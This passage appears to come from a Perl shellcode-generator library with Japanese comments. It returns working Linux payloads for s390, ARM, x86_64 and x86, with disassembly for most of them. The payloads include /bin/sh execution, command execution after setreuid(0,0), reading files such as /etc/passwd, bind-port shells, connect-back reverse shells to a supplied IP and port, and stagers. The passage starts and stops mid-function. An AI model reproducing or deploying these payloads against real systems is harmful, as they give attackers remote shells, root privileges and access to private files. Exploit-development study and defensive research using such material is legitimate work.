		"\x50\x20\x10\xb8".            	#/* st      %r2,184(%r1)			*/
		"\x41\x30\x10\xb8".            	#/* la      %r3,184(%r1)			*/
		"\x17\x44".                 	#/* xr      %r4,%r4			*/
		"\x42\x40\x10\xb7".           	#/* stc     %r4,183(%r1)			*/
		"\x50\x40\x10\xbc".           	#/* st      %r4,188(%r1)			*/
		"\x41\x40\x10\xbc".            	#/* la      %r4,188(%r1)			*/
		"\x0d\xe9".                  	#/* basr    %r14,%r9			*/
		"\x0b\x66".                  	#/* svc 102  <--- after modification	*/
		"\x07\xfe".                  	#/* br      %r14				*/
		pack('N', $ipaddr).            	#/* ip-address to connect back		*/
		"\x2f\x62\x69\x6e".				#/* /bin					*/
		"\x2f\x73\x68\x00";				#/* /sh\\				*/
	}
	elsif ($type eq 'stager') { 
	}
	return $ret;
}

# レジスタr7にシステムコール番号をセット
# レジスタr0,r1,r2,r3,r4,r5にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# svc 命令を実行
# 戻り値はr0
# nop=>\xc0\x46 ; mov r8, r8
# arm16のバイナリを参考に書いた方がshellcodeが小さくなる
# 0x00を含めたくない場合にも有効
# 参考:
# http://www.exploit-db.com/papers/15652/
# http://www.mztn.org/slasm/arm07.html
# e.g. as -mthumb -o a.o a.s
# 短い命令で複数レジスタのpush/popが可能。知っているとshellcode（任意コマンドの実行など）をシンプルに記述できる。
# e.g.
# b40f            push    {r0, r1, r2, r3}
# svc命令のオペランドに1を指定すると0x00を含めなくて済む
sub get_arm_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#    8054:	e28f3001 	add	r3, pc, #1	; 0x1
		#    8058:	e12fff13 	bx	r3
		#    805c:	4678      	mov	r0, pc
		#    805e:	3008      	adds	r0, #8
		#    8060:	1a49      	subs	r1, r1, r1
		#    8062:	1a92      	subs	r2, r2, r2
		#    8064:	270b      	movs	r7, #11
		#    8066:	df01      	svc	1
		#    8068:	622f      	str	r7, [r5, #32]
		#    806a:	6e69      	ldr	r1, [r5, #100]
		#    806c:	732f      	strb	r7, [r5, #12]
		#    806e:	0068      	lsls	r0, r5, #1
		$ret = "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a".
		"\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68";
	} 
	elsif ($type eq 'dup2') {
		#   0:   e28f6001        add     r6, pc, #1
		#   4:   e12fff16        bx      r6
		#   8:   273f            movs    r7, #63 ; 0x3f
		#   a:   2102            movs    r1, #2
		#   c:   2003            movs    r0, #3
		#   e:   df01            svc     1
		#  10:   3901            subs    r1, #1
		#  12:   d5fb            bpl.n   0xc
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
		$ret = "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x3f\x27\x02\x21".pack('C', $fd)."\x20\x01\xdf\x01\x39\xfb\xd5";
	}
	elsif ($type eq 'execcmd') { 
		#   0:   e28f6001        add     r6, pc, #1
		#   4:   e12fff16        bx      r6
		#  14:   1adb            subs    r3, r3, r3
		#  16:   467a            mov     r2, pc
		#  18:   321d            adds    r2, #29
		#  1a:   4679            mov     r1, pc
		#  1c:   3116            adds    r1, #22
		#  1e:   4678            mov     r0, pc
		#  20:   300a            adds    r0, #10
		#  22:   b40f            push    {r0, r1, r2, r3}
		#  24:   1c1a            adds    r2, r3, #0
		#  26:   4669            mov     r1, sp
		#  28:   270b            movs    r7, #11
		#  2a:   df01            svc     1
		#  2c:   622f            str     r7, [r5, #32]
		#  2e:   6e69            ldr     r1, [r5, #100]  ; 0x64
		#  30:   732f            strb    r7, [r5, #12]
		#  32:   0068            lsls    r0, r5, #1
		#  34:   632d            str     r5, [r5, #48]   ; 0x30
		#  36:   6300            str     r0, [r0, #48]   ; 0x30
		my $cmd = shift || return '';
		return '' if (length($cmd) < 1);
		$ret =  "\x01\x60\x8f\xe2\x16\xff\x2f\xe1".
			"\xdb\x1a\x7a\x46\x1d\x32\x79\x46\x16\x31\x78\x46\x0a\x30\x0f\xb4\x1a\x1c\x69\x46\x0b\x27\x01\xdf".
			"\x2f\x62\x69\x6e\x2f\x73\x68\x00\x2d\x63\x00".$cmd."\x00";
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
		#   0:   e28f6001        add     r6, pc, #1
		#   4:   e12fff16        bx      r6
		#   8:   2180            movs    r1, #128        ; 0x80
		#   a:   01c9            lsls    r1, r1, #7
		#   c:   4678            mov     r0, pc
		#   e:   3022            adds    r0, #34 ; 0x22
		#  10:   2705            movs    r7, #5
		#  12:   df01            svc     1
		#  14:   2201            movs    r2, #1
		#  16:   0312            lsls    r2, r2, #12
		#  18:   4906            ldr     r1, [pc, #24]   ; (0x34)
		#  1a:   278d            movs    r7, #141        ; 0x8d
		#  1c:   df01            svc     1
		#  1e:   2201            movs    r2, #1
		#  20:   0312            lsls    r2, r2, #12
		#  22:   4904            ldr     r1, [pc, #16]   ; (0x34)
		#  24:   2001            movs    r0, #1
		#  26:   2704            movs    r7, #4
		#  28:   df01            svc     1
		#  2a:   1b24            subs    r4, r4, r4
		#  2c:   1c20            adds    r0, r4, #0
		#  2e:   2701            movs    r7, #1
		#  30:   df01            svc     1
		#  32:   002e            lsls    r6, r5, #0
		#  34:   0000            lsls    r0, r0, #0
		my $dir = shift || return '';
		my $bss_addr = shift || return '';
		# 微調整実施=>読み込み先をbssに変更,読み込みサイズを1024に変更
		$ret =  "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x80\x21\xc9\x01\x78\x46\x28\x30"."\x05\x27".
			"\x01\xdf\x04\x22\x12\x02\x06\x49".
			"\x8d\x27\x01\xdf\x02\x22\x12\x02\x04\x49".
			"\x01\x20\x04\x27\x01\xdf\x24\x1b\x20\x1c\x01\x27\x01\xdf"."\x41\x41".pack('V', $bss_addr).$dir."\x00";
	}
	elsif ($type eq 'readfile') { 
		#   0:   e28f6001        add     r6, pc, #1
		#   4:   e12fff16        bx      r6
		#   8:   1a49            subs    r1, r1, r1
		#   a:   4678            mov     r0, pc
		#   c:   301a            adds    r0, #26
		#   e:   2705            movs    r7, #5
		#  10:   df01            svc     1
		#  12:   227f            movs    r2, #127        ; 0x7f
		#  14:   4903            ldr     r1, [pc, #12]   ; (0x24)
		#  16:   2703            movs    r7, #3
		#  18:   df01            svc     1
		#  1a:   2001            movs    r0, #1
		#  1c:   2704            movs    r7, #4
		#  1e:   df01            svc     1
		#  20:   2701            movs    r7, #1
		#  22:   df01            svc     1
		#  24:   0000            lsls    r0, r0, #0      ; bss_addr
		#  26:   0000            lsls    r0, r0, #0      ; bss_addr
		#  28:   2f2e            cmp     r7, #46 ; 0x2e  ; file
		#  2a:   6c66            ldr     r6, [r4, #68]   ; file
		#  2c:   6761            str     r1, [r4, #116]  ; file
		my $file = shift || return '';
		my $bss_addr = shift || return '';
		$ret =  "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x49\x1a\x78\x46\x1a\x30\x05\x27\x01\xdf\x7f\x22\x03\x49".
			"\x03\x27\x01\xdf\x01\x20\x04\x27\x01\xdf\x01\x27\x01\xdf".pack('V', $bss_addr).$file."\x00";
	}
	elsif ($type eq 'portbind') { 
	}
	elsif ($type eq 'connectback') { 
		## switch to Thumb mode (16-bit ops) 
		#        .code 32
		#        add     r1, pc, #1
		#        bx      r1
		## Thumb instructions follow
		#        .code 16
		## socket(2, 1, 0)
		#        mov     r0, #2
		#        mov     r1, #1
		#        sub     r2, r2, r2
		#        lsl     r7, r1, #8
		#        add     r7, r7, #25
		#        svc     1
		## connect(r0, &addr, 16)
		#        mov     r6, r0
		#        add     r1, pc, #32
		#        mov     r2, #16
		#        add     r7, #2
		#        svc     1
		## dup2(r0, 0/1/2)
		#        mov     r7, #63
		#        mov     r1, #2
		#Lb:
		#        mov     r0, r6
		#        svc     1
		#        sub     r1, #1
		#        bpl     Lb
		## execve("/bin/sh", ["/bin/sh", 0], 0) 
		#        add     r0, pc, #20
		#        sub     r2, r2, r2
		#        push    {r0, r2}
		#        mov     r1, sp
		#        mov     r7, #11
		#        svc     1
		## struct sockaddr 
		#.align 2
		#.short 0x2
		#.short 0x3412	# port	
		#.byte 10,0,2,2	# IP
		#.ascii "/bin/sh\0\0"	# shell
		my $ipaddr = shift || return '';
		$ipaddr = &ipv4addr_to_int($ipaddr);
		return '' if (!defined $ipaddr);
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		$ret = "\x01\x10\x8F\xE2\x11\xFF\x2F\xE1" .
		"\x02\x20\x01\x21\x92\x1A\x0F\x02\x19\x37\x01" .
		"\xDF\x06\x1C\x08\xA1\x10\x22\x02\x37\x01\xDF" .
		"\x3F\x27\x02\x21\x30\x1c\x01\xdf\x01\x39\xFB" .
		"\xD5\x05\xA0\x92\x1a\x05\xb4\x69\x46\x0b\x27" .
		"\x01\xDF\xC0\x46" .
		"\x02\x00" . pack('n', $port) . pack('N', $ipaddr) .
		"\x2f\x62\x69\x6e\x2f\x73\x68\x00";
	}
	elsif ($type eq 'stager') { 
		#   0:   e28f6001        add     r6, pc, #1
		#   4:   e12fff16        bx      r6
		#   8:   227f            movs    r2, #127        ; 0x7f
		#   a:   4902            ldr     r1, [pc, #8]    ; (0x14)
		#   c:   2005            movs    r0, #5
		#   e:   2703            movs    r7, #3
		#  10:   df01            svc     1
		#  12:   4708            bx      r1
		#  14:   0000            lsls    r0, r0, #0
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
		my $addr = shift || return '';
		$ret =  "\x01\x60\x8f\xe2\x16\xff\x2f\xe1\x7f\x22\x02\x49" .
			pack('C', $fd)."\x20\x03\x27\x01\xdf\x08\x47".pack('V', $addr);
	}
	return $ret;
}

# レジスタraxにシステムコール番号をセット
# レジスタrdi,rsi,rdx,r10,r8,r9にそれぞれ一つ目、二つ目、三つ目、四つ目、五つ目、六つ目の引数を格納
# syscall 命令を実行
# 戻り値はrax
# nop=>\x90
sub get_x86_64_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#    "\x31\xc0"					     // xor    %eax, %eax => rax = 0
		#    "\x99"                                          // cdq    =>rdx=0
		#    "\x48\x31\xd2"                                  // xor    %rdx, %rdx
		#    "\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68"      // mov	$0x68732f6e69622f2f, %rbx
		#    "\x48\xc1\xeb\x08"                              // shr    $0x8, %rbx
		#    "\x53"                                          // push   %rbx
		#    "\x48\x89\xe7"                                  // mov    %rsp, %rdi
		#    "\x50"                                          // push   %rax
		#    "\x57"                                          // push   %rdi
		#    "\x48\x89\xe6"                                  // mov    %rsp, %rsi
		#    "\xb0\x3b"                                      // mov    $0x3b, %al
		#    "\x0f\x05";                                     // syscall
		$ret = "\x31\xc0\x99\x48\xbb\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";
	} 
	elsif ($type eq 'dup2') {
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
		#   0:   6a 04                   pushq  $0x4
		#   2:   5f                      pop    %rdi
		#   3:   6a 02                   pushq  $0x2
		#   5:   5e                      pop    %rsi
		#   6:   6a 21                   pushq  $0x21
		#   8:   58                      pop    %rax
		#   9:   0f 05                   syscall
		#   b:   48 ff ce                dec    %rsi
		#   e:   79 f6                   jns    0x6
		$ret .= "\x6a".pack('C', $fd);
		$ret .= "\x5f";
		$ret .= "\x6a\x02";
		$ret .= "\x5e";
		$ret .= "\x6a\x21";
		$ret .= "\x58";
		$ret .= "\x0f\x05";
		$ret .= "\x48\xff\xce";
		$ret .= "\x79\xf6";
	}
	elsif ($type eq 'execcmd') { 
		#   0:   eb 29                   jmp    0x2b
		#   2:   41 58                   pop    %r8
		#   4:   6a 3b                   pushq  $0x3b
		#   6:   58                      pop    %rax
		#   7:   48 31 d2                xor    %rdx,%rdx
		#   a:   52                      push   %rdx
		#   b:   66 68 2d 63             pushw  $0x632d
		#   f:   48 89 e6                mov    %rsp,%rsi
		#  12:   52                      push   %rdx
		#  13:   48 bf 2f 62 69 6e 2f    movabs $0x68732f2f6e69622f,%rdi
		#  1a:   2f 73 68
		#  1d:   57                      push   %rdi
		#  1e:   48 89 e7                mov    %rsp,%rdi
		#  21:   52                      push   %rdx
		#  22:   41 50                   push   %r8
		#  24:   56                      push   %rsi
		#  25:   57                      push   %rdi
		#  26:   48 89 e6                mov    %rsp,%rsi
		#  29:   0f 05                   syscall
		#  2b:   e8 d2 ff ff ff          callq  0x2
		#  30:   63 6d 64                movslq 0x64(%rbp),%ebp
		my $cmd = shift || return '';
		return '' if (length($cmd) < 1);
		$ret =  "\xeb\x29\x41\x58\x6a\x3b\x58\x48\x31\xd2\x52\x66\x68\x2d\x63\x48\x89\xe6\x52\x48\xbf\x2f\x62\x69\x6e\x2f".
			"\x2f\x73\x68\x57\x48\x89\xe7\x52\x41\x50\x56\x57\x48\x89\xe6\x0f\x05".
			"\xe8\xd2\xff\xff\xff".$cmd."\x00";
	}
	elsif ($type eq 'setresuid') { 
	}
	elsif ($type eq 'readdir') { 
		my $dir = shift || return '';
		my $bss_addr = shift || return '';
		#   0:   eb 36                   jmp    0x38
		#   2:   5f                      pop    %rdi
		#   3:   68 00 00 01 00          pushq  $0x10000
		#   8:   5e                      pop    %rsi
		#   9:   48 31 d2                xor    %rdx,%rdx
		#   c:   6a 02                   pushq  $0x2
		#   e:   58                      pop    %rax
		#   f:   0f 05                   syscall
		#  11:   48 97                   xchg   %rax,%rdi
		#  13:   68 41 41 41 41          pushq  $0x41414141
		#  18:   5e                      pop    %rsi
		#  19:   6a 4e                   pushq  $0x4e
		#  1b:   58                      pop    %rax
		#  1c:   68 00 20 00 00          pushq  $0x2000
		#  21:   5a                      pop    %rdx
		#  22:   0f 05                   syscall
		#  24:   48 92                   xchg   %rax,%rdx
		#  26:   6a 01                   pushq  $0x1
		#  28:   5f                      pop    %rdi
		#  29:   6a 01                   pushq  $0x1
		#  2b:   58                      pop    %rax
		#  2c:   0f 05                   syscall
		#  2e:   48 97                   xchg   %rax,%rdi
		#  30:   68 e7 00 00 00          pushq  $0xe7
		#  35:   58                      pop    %rax
		#  36:   0f 05                   syscall
		#  38:   e8 c5 ff ff ff          callq  0x2
		#  3d:   66                      data16
		$ret =  "\xeb\x36\x5f\x68\x00\x00\x01\x00\x5e\x48\x31\xd2\x6a\x02\x58\x0f\x05".
			"\x48\x97\x68" . pack('V', $bss_addr) .
			"\x5e\x6a\x4e\x58\x68\x00\x20\x00\x00\x5a\x0f\x05\x48\x92\x6a\x01\x5f\x6a\x01\x58\x0f\x05\x48\x97" .
			"\x68\xe7\x00\x00\x00\x58\x0f\x05\xe8\xc5\xff\xff\xff".$dir."\x00";
	}
	elsif ($type eq 'readfile') { 
		# BITS 64
		# ; Author Mr.Un1k0d3r - RingZer0 Team
		# ; Read /etc/passwd Linux x86_64 Shellcode
		# ; Shellcode size 82 bytes
		# global _start
		# 
		# section .text
		# 
		# _start:
		# jmp _push_filename
		#   
		# _readfile:
		# ; syscall open file
		# pop rdi ; pop path value
		# ; NULL byte fix
		# xor byte [rdi + 11], 0x41
		#   
		# xor rax, rax
		# add al, 2
		# xor rsi, rsi ; set O_RDONLY flag
		# syscall
		#   
		# ; syscall read file
		# sub sp, 0xfff
		# lea rsi, [rsp]
		# mov rdi, rax
		# xor rdx, rdx
		# mov dx, 0xfff; size to read
		# xor rax, rax
		# syscall
		#   
		# ; syscall write to stdout
		# xor rdi, rdi
		# add dil, 1 ; set stdout fd = 1
		# mov rdx, rax
		# xor rax, rax
		# add al, 1
		# syscall
		#   
		# ; syscall exit
		# xor rax, rax
		# add al, 60
		# syscall
		#   
		# _push_filename:
		# call _readfile
		# path: db "/etc/passwdA"
		my $file = shift || return '';
		$ret =  "\xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff".$file."\x00"
	}
	elsif ($type eq 'portbind') { 
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		$ret = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48".
			"\x97\x52\xc7\x04\x24\x02\x00".pack('n', $port)."\x48\x89\xe6\x6a".
			"\x10\x5a\x6a\x31\x58\x0f\x05\x6a\x32\x58\x0f\x05\x48".
			"\x31\xf6\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\x48".
			"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58\x99".
			"\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48\x89".
			"\xe7\x52\x57\x48\x89\xe6\x0f\x05";
	}
	elsif ($type eq 'connectback') { 
		my $ipaddr = shift || return '';
		$ipaddr = &ipv4addr_to_int($ipaddr);
		return '' if (!defined $ipaddr);
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		$ret = "\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05\x48".
			"\x97\x48\xb9\x02\x00".pack('n', $port).pack('N', $ipaddr)."\x51\x48".
			"\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05\x6a\x03\x5e".
			"\x48\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x6a\x3b\x58".
			"\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00\x53\x48".
			"\x89\xe7\x52\x57\x48\x89\xe6\x0f\x05";
	}
	elsif ($type eq 'stager') { 
		#   0:   48 be 41 41 41 41 41    movabs $0x4141414141414141,%rsi
		#   7:   41 41 41
		#   a:   6a 7f                   pushq  $0x7f
		#   c:   5a                      pop    %rdx
		#   d:   6a 03                   pushq  $0x3
		#   f:   5f                      pop    %rdi
		#  10:   48 31 c0                xor    %rax,%rax
		#  13:   0f 05                   syscall
		#  15:   56                      push   %rsi
		#  16:   c3                      retq
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
		my $addr = shift || return '';
		$ret =  "\x48\xbe".pack('Q', $addr).
			"\x6a\x7f\x5a\x6a".pack('C', $fd)."\x5f\x48\x31\xc0\x0f\x05\x56\xc3";
	}
	return $ret;
}

# レジスタeaxにシステムコール番号をセット
# レジスタebx,ecx,edxにそれぞれ一つ目、二つ目、三つ目の引数を格納
# int 0x80 命令を実行
# 戻り値はeax
# nop=>\x90
sub get_x86_binary {
	my $type = shift || return '';
	my $ret = '';
	if ($type eq 'sh' or $type eq 'execve') {
		#; execve(const char *filename, char *const argv [], char *const envp[])
		#  xor eax, eax      ; eaxをゼロクリアする
		#  push eax          ; 文字列を終端させるためにnullバイト（複数）を格納する
		#  push 0x68732f2f   ; "//sh"をスタックにプッシュする
		#  push 0x6e69622f   ; "/bin"をスタックにプッシュする
		#  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
		#  push eax          ; スタックに32ビットのnull終端をプッシュする
		#  mov edx, esp      ; これはenvp用の空の配列である
		#  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
		#  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
		#  mov al, 11        ; システムコール番号は11
		#  int 0x80          ; システムコールを実行する
		$ret .= "\x31\xc0";
		$ret .= "\x50";
		$ret .= "\x68\x2f\x2f\x73\x68";
		$ret .= "\x68\x2f\x62\x69\x6e";
		$ret .= "\x89\xe3";
		$ret .= "\x50";
		$ret .= "\x89\xe2";
		$ret .= "\x53";
		$ret .= "\x89\xe1";
		$ret .= "\xb0\x0b";
		$ret .= "\xcd\x80";
	} 
	elsif ($type eq 'dup2') {
		my $fd = shift || return '';
		$fd = int($fd);
		return '' if ($fd < 0 || $fd > 0xff);
		#; dup2
		#  xor eax, eax
		#  cdq               ; edxをゼロクリアする
		#  push BYTE 0x4     ; ebxは4(第一引数のfdは4)
		#  pop ebx
		#  push BYTE 0x2     ; ecxは2から開始する
		#  pop ecx
		#dup_loop:
		#  mov BYTE al, 0x3F ; dup2はシステムコール63番
		#  int 0x80          ; dup2(4, 2),dup2(4, 1),dup2(4, 0)
		#  dec ecx           ; 0に向かってカウントダウンを行う
		#  jns dup_loop      ; サインフラグがセットされていない、すなわちecxが負ではない場合
		$ret .= "\x31\xc0";
		$ret .= "\x99";
		$ret .= "\x6a".pack('C', $fd);
		$ret .= "\x5b";
		$ret .= "\x6a\x02";
		$ret .= "\x59";
		$ret .= "\xb0\x3f";
		$ret .= "\xcd\x80";
		$ret .= "\x49";
		$ret .= "\x79\xf9";
	}
	elsif ($type eq 'execcmd') { # execve()
		my $cmd = shift || return '';
		return '' if (length($cmd) < 1);
		$ret = '';
		# Linux/x86 bytecode that executes command after setreuid
		# (9 + 40 bytes + cmd)
		# 
		# setreuid(0, 0) + execve("/bin//sh", ["/bin//sh","-c","cmd"], NULL);
		#
		# "cmd" MUST be terminated with ";" (better with ";exit;" :-D)
		#
		# bunker - http://rawlab.mindcreations.com
		# 37F1 A7A1 BB94 89DB A920  3105 9F74 7349 AF4C BFA2
		#
		# setreuid(0, 0);
		# 00000000  6a46              push byte +0x46
		# 00000002  58                pop eax
		# 00000003  31db              xor ebx,ebx
		# 00000005  31c9              xor ecx,ecx
		# 00000007  cd80              int 0x80
		#
		# execve("/bin//sh", ["/bin//sh", "-c", "cmd"], NULL);
		# 00000009  eb21              jmp short 0x2c
		# 0000000b  5f                pop edi
		# 0000000c  6a0b              push byte +0xb
		# 0000000e  58                pop eax
		# 0000000f  99                cdq
		# 00000010  52                push edx
		# 00000011  66682d63          push word 0x632d
		# 00000015  89e6              mov esi,esp
		# 00000017  52                push edx
		# 00000018  682f2f7368        push dword 0x68732f2f
		# 0000001d  682f62696e        push dword 0x6e69622f
		# 00000022  89e3              mov ebx,esp
		# 00000024  52                push edx
		# 00000025  57                push edi
		# 00000026  56                push esi
		# 00000027  53                push ebx
		# 00000028  89e1              mov ecx,esp
		# 0000002a  cd80              int 0x80
		# 0000002c  e8daffffff        call 0xb
		# 00000031  ....              "cmd; exit;"
		$ret =  "\x6a\x46\x58\x31\xdb\x31\xc9\xcd\x80\xeb\x21\x5f\x6a\x0b\x58\x99" .
			"\x52\x66\x68\x2d\x63\x89\xe6\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62" .
			"\x69\x6e\x89\xe3\x52\x57\x56\x53\x89\xe1\xcd\x80\xe8\xda\xff\xff\xff" .
			"$cmd;";
	}
	elsif ($type eq 'setresuid') { # execve()
                #; setresuid(uid_t ruid, uid_t euid, uid_t suid);
                #   0:   31 c0                   xor    %eax,%eax
                #   2:   31 db                   xor    %ebx,%ebx
                #   4:   31 c9                   xor    %ecx,%ecx
                #   6:   99                      cltd
                #   7:   b0 a4                   mov    $0xa4,%al
                #   9:   cd 80                   int    $0x80
		$ret = "\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80";
	}
	elsif ($type eq 'readdir') { # openat(2), getdents(2)
		my $dir = shift || return '';
		$ret = "\xEB\x38\x5B\x31\xC9\x31\xD2\x6A\x05\x58\xCD\x80\x93\x91\xB2\x7F\xB0\x59\x60\xCD\x80\x85\xC0\x74\x26\xB3\x01\x66\x0F\xB6\x51\x08\x8D\x4C\x19\x09\xB0\x04\xCD\x80\xB2\x01\x8D\x4A\x09\x51\x89\xE5\x55\x59\xB0\x04\xCD\x80\x58\x61\xEB\xD8\xE8\xC3\xFF\xFF\xFF". $dir ."\x00";
	}
	elsif ($type eq 'readfile') { # open(2), read(2), write(2), exit(2)
		my $file = shift || return '';
		$ret = "\x31\xDB\xF7\xE3\xEB\x26\x5B\xB0\x05\x31\xC9\xCD\x80\x89\xC6\x89\xF3\xB0\x03\x54\x59\xB2\x01\xCD\x80\x31\xDB\x39\xC3\x75\x03\x40\xCD\x80\xB0\x04\xB3\x01\xB2\x01\xCD\x80\xEB\xE3\xE8\xD5\xFF\xFF\xFF". $file ."\x00";
	}
	elsif ($type eq 'portbind') { # 
		my $port = shift || return '';
		$port = int($port);
		return '' if ($port < 0 || $port > 65535);
		#; s = socket(2, 1, 0)
		#  push BYTE 0x66    ; socketcallはシステムコール102番（0x66）
		#  pop eax
		#  cdq               ; DWORDのnullとして使用するためにedxをゼロクリアする
		#  xor ebx, ebx      ; ebxはsocketcallのタイプ
		#  inc ebx           ; 1 = SYS_SOCKET = socket()
		#  push edx          ; 引数の配列を生成する： { protocol = 0,
		#  push BYTE 0x1     ;   （逆順）               SOCK_STREAM = 1,
		#  push BYTE 0x2     ;                          AF_INET = 2 }
		#  mov ecx, esp      ; ecx = 引数の配列へのポインタ
		#  int 0x80          ; システムコールの後、eaxにはソケットファイル記述子が格納される
		#
		#  xchg esi, eax     ; 後で使用するためにソケットファイル記述子をesiに保存する
		#
		#; bind(s, [2, 31337, 0], 16)
		#  push BYTE 0x66    ; socketcall （システムコール102番）
		#  pop eax
		#  inc ebx           ; ebx = 2 = SYS_BIND = bind()
		#  push edx          ; sockaddr構造体を生成する：  INADDR_ANY = 0
		#  push WORD 0x697a  ;   （逆順）                  PORT = 31337
		#  push WORD bx      ;                             AF_INET = 2
		#  mov ecx, esp      ; ecx = サーバ構造体へのポインタ
		#  push BYTE 16      ; argv: { sizeof(server struct) = 16,
		#  push ecx          ;         server struct pointer,
		#  push esi          ;         socket file descriptor }
		#  mov ecx, esp      ; ecx = 引数の配列
		#  int 0x80          ; eax = 0（成功時）
		#
		#; listen(s, 0)
		#  mov BYTE al, 0x66 ; socketcall （システムコール102番）
		#  inc ebx
		#  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
		#  push ebx          ; argv: { backlog = 4,
		#  push esi          ;         socket fd }
		#  mov ecx, esp      ; ecx = 引数の配列
		#  int 0x80
		#
		#; c = accept(s, 0, 0)
		#  mov BYTE al, 0x66 ; socketcall （システムコール102番）
		#  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
		#  push edx          ; argv: { socklen = 0,
		#  push edx          ;         sockaddr ptr = NULL,
		#  push esi          ;         socket fd }
		#  mov ecx, esp      ; ecx = 引数の配列
		#  int 0x80          ; eax = 接続されたソケットファイル記述子
		#
		#; dup2(connected socket, ｛標準入出力ファイル記述子すべて｝)
		#  xchg eax, ebx     ; ソケットファイル記述子をebxに、0x00000005をeaxに設定する
		#  push BYTE 0x2     ; ecxは2から開始する
		#  pop ecx
		#dup_loop:
		#  mov BYTE al, 0x3F ; dup2はシステムコール63番
		#  int 0x80          ; dup2(c, 0)
		#  dec ecx           ; 0に向かってカウントダウンを行う
		#  jns dup_loop      ; サインフラグがセットされていない、すなわちecxが負ではない場合
		#
		#; execve(const char *filename, char *const argv [], char *const envp[])
		#  mov BYTE al, 11   ; execveはシステムコール11番
		#  push edx          ; 文字列を終端させるためにnullバイト（複数）をプッシュする
		#  push 0x68732f2f   ; "//sh"をスタックにプッシュする
		#  push 0x6e69622f   ; "/bin"をスタックにプッシュする
		#  mov ebx, esp      ; "/bin//sh"のアドレスをesp経由でebxに格納する
		#  push edx          ; スタックに32ビットのnull終端をプッシュする
		#  mov edx, esp      ; これはenvp用の空の配列である
		#  push ebx          ; null終端の上にある文字列のアドレスをスタックにプッシュする
		#  mov ecx, esp      ; これは文字列ポインタを用いたargv用の配列である
		#  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
		$ret =  "\x6a\x66\x58\x99\x31\xdb\x43\x52\x6a\x01\x6a\x02\x89\xe1\xcd\x80" .
			"\x96\x6a\x66\x58\x43\x52\x66\x68".pack("n", $port) . 
			"\x66\x53\x89\xe1\x6a\x10" .
			"\x51\x56\x89\xe1\xcd\x80\xb0\x66\x43\x43\x53\x56\x89\xe1\xcd\x80" .
			"\xb0\x66\x43\x52\x52\x56\x89\xe1\xcd\x80\x93\x6a\x02\x59\xb0\x3f" .
			"\xcd\x80\x49\x79\xf9\xb0\x0b\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62" .
			"\x69\x6e\x89\xe3\x52\x89\xe2\x53\x89\xe1\xcd\x80"
	}
	elsif ($type eq 'connectback') { # 
		$ret = '';
		#; s = socket(2, 1, 0)
		#  push BYTE 0x66    ; socketcallはシステムコール102番（0x66）
		#  pop eax
		#  cdq               ; DWORDのnullとして使用するためにedxをゼロクリアする
		#  xor ebx, ebx      ; ebxはsocketcallのタイプ
		#  inc ebx           ; 1 = SYS_SOCKET = socket()
		#  push edx          ; 引数の配列を生成する： { protocol = 0,
		#  push BYTE 0x1     ;   （逆順）               SOCK_STREAM = 1,
		#  push BYTE 0x2     ;                          AF_INET = 2 }
		#  mov ecx, esp      ; ecx = 引数の配列へのポインタ
		#  int 0x80          ; システムコールの後、eaxにはソケットファイル記述子が格納される
		#
		#  xchg esi, eax     ; 後で使用するためにソケットファイル記述子をesiに保存する
		#
		#; connect(s, [2, 31337, <IP address>], 16)
		#  push BYTE 0x66    ; socketcall （システムコール102番）
		#  pop eax
		#  inc ebx           ; ebx = 2 （AF_INETのために必要）
		#  push DWORD 0x482aa8c0 ; sockaddr構造体を生成する： IP address = 192.168.42.72
